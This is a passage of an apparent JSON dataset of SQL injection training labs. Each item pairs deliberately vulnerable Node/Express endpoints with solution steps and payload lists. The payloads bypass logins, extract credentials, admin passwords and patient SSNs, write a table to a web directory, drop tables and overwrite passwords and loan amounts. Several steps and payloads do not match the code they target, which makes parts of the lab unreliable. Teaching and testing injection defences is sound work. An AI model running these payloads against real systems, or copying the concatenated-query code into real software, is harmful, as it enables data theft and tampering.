    "Lab Description": "The backend API dynamically builds SQL queries using user-controlled data in the GROUP BY clause. Lack of input validation enables attackers to interfere with grouping logic. To solve: exploit grouping to reveal data from unauthorized rows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Run OWASP ZAP spider and passive scan on target endpoint",
      "Inspect server response to malformed inputs for SQL errors",
      "Inject ' OR 1=1#",
      "Use sqlmap --level=5 --technique=U to fully exploit",
      "Exfiltrate database version via SELECT @@version"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device', (req, res) => {\n    const group = req.body.group;\n    const query = \"SELECT * FROM devices GROUP BY \" + group;\n    connection.query(query, (err, result) => {\n        if (err) return res.status(500).send(err.message);\n        res.json(result);\n    });\n});",
    "payloads": [
      "' OR 1=1#",
      "' UNION SELECT username , password FROM users -- ",
      "' ORDER BY 3 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in WHERE clause",
    "Lab Description": "A search feature on the IoT dashboard uses user inputs directly in a WHERE clause without proper escaping. This introduces SQL injection. To solve: bypass filtering and enumerate connected devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap with --risk=3 for deep analysis of form fields",
      "Use Boolean conditions to detect differences in responses",
      "Use ' OR SLEEP(5)-- for time-based inference",
      "Tune boolean payloads for nested conditions",
      "Capture HTTP response with leaked data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n    const device = req.query.device;\n    const query = \"SELECT * FROM sensors WHERE name = '\" + device + \"'\";\n    db.query(query, (err, result) => {\n        if (err) res.send(err.message);\n        else res.json(result);\n    });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in HAVING condition",
    "Lab Description": "The banking portal allows advanced filtering of transactions using a HAVING clause. It fails to validate inputs used in aggregate functions. To solve: manipulate HAVING to leak high-value transaction data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept requests and analyze parameters",
      "Inject ' OR '1'='1 and observe behavior",
      "Use ' OR SLEEP(5)-- for time-based inference",
      "Adjust number of columns in UNION until no error is shown",
      "Extract user credentials from users table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter', (req, res) => {\n    const amount = req.query.amount;\n    const query = \"SELECT user, SUM(balance) as total FROM transactions GROUP BY user HAVING total > \" + amount;\n    connection.query(query, (err, result) => {\n        if (err) return res.status(500).send(\"Error: \" + err);\n        res.json(result);\n    });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' UNION SELECT NULL,NULL -- ",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in search query with ORDER BY",
    "Lab Description": "The CMS search feature uses unvalidated user input in an ORDER BY clause. It fails to whitelist columns, allowing attackers to control the ordering logic and perform SQL injection. To solve: enumerate columns and extract hidden post metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz the `sort` parameter",
      "Inject ' ORDER BY 1 -- to identify column range",
      "Use UNION SELECT to inject crafted data",
      "Enumerate column names via error-based injection",
      "Extract hidden metadata from 'posts' table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT title, body FROM posts ORDER BY ${sort}`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result);\n  });\n});",
    "payloads": [
      "1; DROP TABLE posts --",
      "' ORDER BY 3 --",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in API POST parameter",
    "Lab Description": "The IoT backend API directly includes POST body parameters in SQL statements without sanitization. Malicious inputs can alter query logic. To solve: perform a time-based blind SQL injection to confirm the flaw and extract device config data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send malformed body parameters",
      "Inject payloads like ' OR SLEEP(5)-- to test time delay",
      "Use sqlmap with --technique=T and --level=5",
      "Confirm data exfiltration via timing difference",
      "Dump device_config table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateDevice', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const query = `UPDATE devices SET active = 1 WHERE id = '${deviceId}'`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send(err.message);\n    else res.send(\"Updated\");\n  });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in login audit trail",
    "Lab Description": "Login audit events are stored using direct SQL inserts based on user input. Attackers can modify query structure to leak historical login data. To solve: inject into logging function to read records from the audit table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture login request",
      "Inject a crafted username that ends in SQL payload",
      "Observe error-based messages in the response",
      "Use UNION SELECT with login_audit columns",
      "Extract timestamp and IP from logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const query = `INSERT INTO login_audit (user, time) VALUES ('${username}', NOW())`;\n  db.query(query, (err) => {\n    if (err) return res.send(\"Error: \" + err);\n    res.send(\"Login recorded\");\n  });\n});",
    "payloads": [
      "attacker'); SELECT * FROM login_audit --",
      "' UNION SELECT NULL --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in filter parameter",
    "Lab Description": "The API gateway allows filtering of user data using unvalidated query parameters. A crafted injection in the `filter` parameter allows full table extraction. To solve: exploit the filter field with UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to submit a GET request with `filter` param",
      "Test with basic ' OR '1'='1' -- to confirm injection",
      "Inject UNION SELECT with nulls until correct column count is found",
      "Replace nulls with sensitive column names",
      "Dump users table via UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/users', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM users WHERE role = '${filter}'`;\n  db.query(query, (err, result) => {\n    if (err) res.send(\"Error: \" + err);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "admin' --",
      "' UNION SELECT NULL,NULL,NULL --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in article comments section",
    "Lab Description": "The comment section of articles directly injects user content into database insert queries. When users modify request parameters, SQL injection is possible. To solve: exploit blind SQLi to enumerate database schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept comment POST request",
      "Modify comment body with time-based injection like '); SLEEP(3);--",
      "Detect delay in server response",
      "Use sqlmap with --technique=T to extract schema info",
      "Enumerate article metadata and comments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`;\n  db.query(query, (err) => {\n    if (err) return res.send(\"Error logging comment: \" + err);\n    res.send(\"Comment posted\");\n  });\n});",
    "payloads": [
      "'); SLEEP(3);--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in HTTP headers",
    "Lab Description": "The API gateway logs user-agent headers directly into the SQL query without sanitization. Attackers can inject SQL through the User-Agent field. To solve: craft a malicious User-Agent to extract user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify HTTP headers",
      "Inject SQL payloads into the User-Agent field like ' OR '1'='1' --",
      "Observe any changes in response to the injection",
      "Use UNION SELECT to leak sensitive data",
      "Dump user credentials and sensitive information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  const query = `SELECT * FROM users WHERE agent = '${userAgent}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in device control parameter",
    "Lab Description": "The device control API accepts user input directly and uses it in an SQL query to change device status. Lack of input validation makes it vulnerable to SQL injection. To solve: inject SQL payloads to control device actions and extract sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests with different device IDs",
      "Inject SQL payloads such as ' OR 1=1 -- into device ID field",
      "Observe successful injection with response changes",
      "Examine the database to extract connected devices",
      "Perform a UNION injection to exfiltrate data from devices table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/controlDevice', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const query = `UPDATE devices SET status = 'active' WHERE id = '${deviceId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Device status updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in transaction filter",
    "Lab Description": "The banking portal allows filtering of transactions via user input. The filter parameter is directly inserted into the SQL query, making it susceptible to SQL injection. To solve: exploit the injection to dump transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify filter request",
      "Inject ' OR 1=1 -- to bypass filtering logic",
      "Use UNION SELECT to retrieve sensitive transaction data",
      "Confirm data retrieval with error messages",
      "Dump transaction details from the transaction_history table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions WHERE category = '${filter}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in query string parameter",
    "Lab Description": "The API gateway exposes an endpoint that allows users to query for product information based on category. The category filter is directly inserted into the SQL query, allowing an attacker to perform SQL injection. To solve: extract product details and bypass filter conditions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request parameters",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Perform UNION-based injection to access product details",
      "Extract column names and sensitive product information",
      "Exfiltrate product details from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in comment filtering",
    "Lab Description": "The CMS filters out comments based on keywords before inserting them into the database. However, the filtering logic is flawed, allowing attackers to bypass restrictions using SQL injection. To solve: bypass filtering and inject malicious SQL payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify comment content",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Test by submitting comments containing UNION SELECT",
      "Bypass filtering by using SQL escape characters",
      "Dump user comment data from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`; \n  db.query(query, (err) => {\n    if (err) return res.send('Error logging comment: ' + err);\n    res.send('Comment posted');\n  });\n});",
    "payloads": [
      "');--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "API SQL injection in user profile update",
    "Lab Description": "The user profile update endpoint allows modifying the user’s details, but the input parameters are directly injected into SQL queries. This results in an SQL injection vulnerability. To solve: extract the database schema and update user details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to intercept and modify the update request",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication",
      "Exploit UNION-based injection to extract database schema",
      "Manipulate query to update user information",
      "Extract sensitive user data after successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateProfile', (req, res) => {\n  const userId = req.body.userId;\n  const name = req.body.name;\n  const query = `UPDATE users SET name = '${name}' WHERE id = '${userId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "'; UPDATE users SET password='newpassword' WHERE id='1' --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in comment filtering",
    "Lab Description": "The CMS allows users to submit comments, but it improperly sanitizes comment input, allowing for SQL injection. To solve: inject SQL payloads that bypass filtering and access sensitive information from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify the POST request",
      "Inject SQL payloads such as ' OR '1'='1' -- to bypass filters",
      "Test for error-based feedback and adjust payload accordingly",
      "Use UNION SELECT to retrieve data from the comments table",
      "Extract user comments and sensitive metadata from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`; \n  db.query(query, (err) => {\n    if (err) return res.send('Error logging comment: ' + err);\n    res.send('Comment posted');\n  });\n});",
    "payloads": [
      "');--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in transaction view",
    "Lab Description": "The banking portal's transaction view feature takes a parameter to filter by account number. The input parameter is directly used in an SQL query. To solve: inject a UNION-based SQL payload to extract sensitive transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET request with `account` param",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Test for successful injection by observing server responses",
      "Perform UNION-based injection to retrieve transaction data",
      "Dump sensitive transaction details from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT * FROM transactions WHERE account_number = '${account}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "IoT device control SQL injection in configuration update",
    "Lab Description": "The device configuration API directly takes input from users and uses it in an SQL query to update device configurations. Lack of sanitization allows for SQL injection. To solve: inject payloads that allow reading sensitive device configurations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send device configuration update requests",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Observe time-based delays to confirm injection success",
      "Use UNION SELECT to dump configuration details from the devices table",
      "Extract configuration data from vulnerable IoT devices"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateDeviceConfig', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const config = req.body.config;\n  const query = `UPDATE devices SET config = '${config}' WHERE id = '${deviceId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Device configuration updated');\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "API SQL injection in search endpoint",
    "Lab Description": "The API’s search feature allows users to search for products by category. However, the input is directly inserted into the SQL query, which makes it vulnerable to SQL injection. To solve: exploit the vulnerability to retrieve product data from different categories.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture and modify GET request",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Perform UNION SELECT injection to retrieve product details",
      "Bypass filter conditions to extract product names and prices",
      "Dump product data from the products table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in loan application",
    "Lab Description": "The loan application form accepts user input, including the loan amount, and inserts it directly into an SQL query without proper sanitization. To solve: inject SQL payloads to access and manipulate the loan data in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify loan application request",
      "Inject payloads such as ' OR 1=1 -- to bypass loan approval logic",
      "Perform UNION-based injection to retrieve loan application details",
      "Extract sensitive loan data from the database",
      "Manipulate loan amounts and approve applications"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/loanApplication', (req, res) => {\n  const amount = req.body.amount;\n  const userId = req.body.userId;\n  const query = `INSERT INTO loans (amount, user_id) VALUES ('${amount}', '${userId}')`; \n  db.query(query, (err) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Loan application submitted');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "'; UPDATE loans SET amount='1000000' WHERE id='1' --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in post creation",
    "Lab Description": "The CMS allows content creators to create posts, and the input is directly inserted into SQL queries. A lack of input sanitization makes the system vulnerable to SQL injection. To solve: inject payloads that manipulate posts in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify POST request for new post",
      "Inject payloads like ' OR '1'='1' -- to bypass validation",
      "Perform UNION-based injection to retrieve post data",
      "Examine the posts table for sensitive content",
      "Extract post data and user metadata"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/createPost', (req, res) => {\n  const title = req.body.title;\n  const content = req.body.content;\n  const query = `INSERT INTO posts (title, content) VALUES ('${title}', '${content}')`; \n  db.query(query, (err) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Post created');\n  });\n});",
    "payloads": [
      "';--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in authentication endpoint",
    "Lab Description": "The authentication endpoint for user login is vulnerable to SQL injection due to improper sanitization of user input. To solve: bypass authentication and retrieve user session details from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept login requests",
      "Inject SQL payloads like ' OR '1'='1' -- in the username or password field",
      "Bypass authentication by observing server response changes",
      "Extract user session tokens using UNION SELECT",
      "Use the extracted session tokens to escalate privileges"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR 1=1 LIMIT 1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account balance lookup",
    "Lab Description": "The banking portal allows users to view account balances based on account number. However, the account number is directly inserted into SQL queries without sanitization. To solve: inject payloads that retrieve sensitive account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request with `account` parameter",
      "Inject SQL payloads like ' OR '1'='1' -- to bypass restrictions",
      "Use UNION SELECT to extract balance data",
      "Extract sensitive account information from the database",
      "Verify successful data retrieval from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/accountBalance', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT balance FROM accounts WHERE account_number = '${account}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in category listing",
    "Lab Description": "The CMS allows users to filter posts by category. The category input is directly inserted into the SQL query without proper sanitization. To solve: inject payloads that list all categories and extract post data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request with `category` parameter",
      "Inject SQL payloads such as ' OR '1'='1' -- to bypass filtering",
      "Perform UNION SELECT to dump category and post data",
      "Extract post titles and user data from the database",
      "Bypass category filtering to retrieve all posts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/category', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM posts WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  }
  ,

  {
    "Lab scenario": "E-commerce API SQL injection in ORDER BY clause",
    "Lab Description": "The product listing API endpoint is vulnerable to SQL injection in the 'sort' parameter which controls ORDER BY. The application directly concatenates user input into the query without sanitization. To solve: bypass WAF filters to extract admin credentials from the users table using a time-based technique.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send GET requests to /api/products?sort=price",
      "Identify WAF blacklist patterns by testing common SQL keywords",
      "Bypass filters using whitespace variations: '/*!50000SELECT*/'",
      "Confirm time delay with: sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE price END)",
      "Extract password character-by-character using: sort=(CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN SLEEP(5) ELSE price END)"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'api_user',\n  password: 'securepass',\n  database: 'ecommerce'\n});\n\napp.get('/api/products', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, name, price FROM products ORDER BY ${sort} LIMIT 10`;\n  \n  console.log(`Executing: ${query}`);\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n      return res.status(500).json({error: 'Database error'});\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE id END)",
      "sort=(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))-- -",
      "sort=price ASC,(SELECT 1 FROM DUAL WHERE SLEEP(5))-- -",
      "sort=1,(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN SLEEP(5) ELSE 1 END))-- -"
    ]
  },
  {
    "Lab scenario": "Healthcare portal SQL injection in HAVING clause",
    "Lab Description": "The patient search feature builds dynamic HAVING conditions vulnerable to injection. The application uses parameterized queries for WHERE but concatenates HAVING directly. To solve: exploit this uncommon injection point to dump the entire patient database including SSNs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept search request with Burp Suite",
      "Identify HAVING clause injection via error messages",
      "Use OWASP ZAP fuzzer to test UNION payloads",
      "Determine column count with HAVING 1=1 UNION SELECT 1,2,3,4,5--",
      "Extract data with: HAVING 1=1 UNION SELECT id,ssn,name,null,null FROM patients--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({/* config */});\n\napp.post('/search', async (req, res) => {\n  const { name, minAge } = req.body;\n  \n  // Vulnerable HAVING construction\n  let having = '';\n  if (req.body.conditions) {\n    having = `HAVING ${req.body.conditions}`;\n  }\n  \n  const query = {\n    text: `SELECT id, name, age FROM patients \n           WHERE name LIKE $1 AND age > $2 \n           ${having}`,\n    values: [name, minAge]\n  };\n  \n  try {\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    console.error(err.stack);\n    res.status(500).send(err.message); // Error leakage\n  }\n});",
    "payloads": [
      "1=1 UNION SELECT 1,2,3,4,5--",
      "1=1 UNION SELECT id,ssn,name,null,null FROM patients--",
      "1=1; COPY (SELECT * FROM patients) TO '/var/www/static/leak.csv'--",
      "1=1 AND (SELECT COUNT(*) FROM patients) > 100--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard blind SQLi in device status filter",
    "Lab Description": "The device management dashboard uses blind SQL injection in the status filter parameter. No direct results are shown but the page length changes when conditions are true. To solve: use boolean-based inference to extract the admin API key from the configuration table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture normal status filter request with Burp",
      "Test boolean conditions: status=1' AND 1=1-- vs status=1' AND 1=2--",
      "Use sqlmap with --string=\"<table\" to detect content differences",
      "Manual exploitation with: status=1' AND (SELECT SUBSTR(api_key,1,1) FROM config)='a'--",
      "Automate with Burp Intruder cluster bomb attack"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\napp.get('/devices', (req, res) => {\n  const db = new sqlite3.Database('iot.db');\n  const status = req.query.status || '1';\n  \n  const query = `SELECT id, name FROM devices WHERE status = ${status}`;\n  \n  db.all(query, [], (err, rows) => {\n    db.close();\n    \n    if (err) {\n      return res.status(500).send('Error');\n    }\n    \n    // Vulnerable - different response length based on data\n    if (rows.length > 0) {\n      res.send(generateLargeTable(rows));\n    } else {\n      res.send(generateEmptyTable());\n    }\n  });\n});",
    "payloads": [
      "1' AND 1=1--",
      "1' AND (SELECT COUNT(*) FROM sqlite_master) > 0--",
      "1' AND (SELECT SUBSTR(api_key,1,1) FROM config)='a'--",
      "1' AND (SELECT HEX(SUBSTR(api_key,1,1)) FROM config)=HEX('a')--"
    ]
  },
  {
    "Lab scenario": "CMS UNION injection with JSON response",
    "Lab Description": "The article search feature in a headless CMS is vulnerable to UNION SQL injection returning JSON. The application uses numeric IDs but string concatenation. To solve: modify the Content-Type header to bypass WAF and extract all user emails.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /api/search with Burp",
      "Change Content-Type to application/xml to bypass WAF",
      "Find column count with ORDER BY",
      "Identify string columns with UNION SELECT 'a','b','c'",
      "Extract data with: UNION SELECT null,email,password FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\napp.post('/api/search', (req, res) => {\n  const db = require('./db');\n  const { id } = req.body;\n  \n  // Vulnerable - no input validation\n  const query = `SELECT id, title, content FROM articles WHERE id = ${id}`;\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      return res.status(500).json({ error: true });\n    }\n    \n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT null,email,password FROM users--",
      "1 UNION SELECT null,@@version,database()--",
      "1 UNION ALL SELECT table_name,column_name,null FROM information_schema.columns--",
      "999 OR 1=1 UNION SELECT 1,2,3,4 FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking portal second-order SQLi in password reset",
    "Lab Description": "The password reset feature stores unsanitized input that gets used in subsequent SQL queries. The application appears secure during initial input but vulnerable when processing the token. To solve: exploit this second-order injection to bypass authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Request password reset for target account",
      "In reset token field use: ' OR '1'='1'--",
      "Intercept token processing with Burp",
      "Observe the token gets used in raw SQL",
      "Login as admin without valid token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// First vulnerable step - stores unsanitized\napp.post('/reset', (req, res) => {\n  const email = req.body.email;\n  const token = req.body.token || generateToken();\n  \n  db.query(`INSERT INTO resets (email, token) VALUES ('${email}', '${token}')`);\n  res.send('Check your email');\n});\n\n// Second vulnerable step - uses stored value\napp.post('/reset-confirm', (req, res) => {\n  const token = req.body.token;\n  \n  // Direct usage in query\n  db.query(`SELECT email FROM resets WHERE token = '${token}'`, (err, result) => {\n    if (result.rows.length) {\n      // Allow password change\n    }\n  });\n});",
    "payloads": [
      "' OR '1'='1'--",
      "' UNION SELECT 'admin@bank.com' FROM users--",
      "'; UPDATE users SET password='hacked' WHERE username='admin'--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "GraphQL SQL injection via inline fragments",
    "Lab Description": "The GraphQL endpoint converts arguments directly to SQL without sanitization. The application uses a custom @sql directive that bypasses security controls. To solve: craft a GraphQL query with SQLi in the filter argument to extract schema information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inspect GraphQL schema in Burp for @sql directives",
      "Send introspection query to find vulnerable fields",
      "Craft query with malicious filter: { products(filter: \"1=1 UNION SELECT 1,table_name FROM information_schema.tables\") }",
      "Use GraphQL variables to bypass simple filters",
      "Extract sensitive columns via field aliasing"
    ],
    "Vulnerability name": "SQL injection",
